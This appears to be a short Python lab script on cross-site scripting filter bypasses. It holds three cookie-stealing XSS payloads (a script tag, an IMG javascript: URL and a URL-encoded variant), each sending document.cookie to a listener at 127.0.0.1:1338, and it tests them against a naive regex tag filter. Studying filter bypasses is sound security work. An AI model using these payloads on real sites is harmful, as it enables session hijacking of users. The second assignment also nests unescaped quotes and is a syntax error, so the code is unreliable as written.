import re

comment = '<script>window.open("http://127.0.0.1:1338/xss/3?cookie=" + document.cookie);</script>'
comment = '<IMG SRC="javascript:window.open('http://127.0.0.1:1338/xss/3?cookie=' + document.cookie);">'
comment = '%3Cscript%3Ewindow.open(%22http://127.0.0.1:1338/xss/3?cookie=%22%20+%20document.cookie)%3C/script%3E'
print(comment)
comment = re.sub(r'<[a-z]*>', '', comment, flags=re.IGNORECASE)
print(comment)
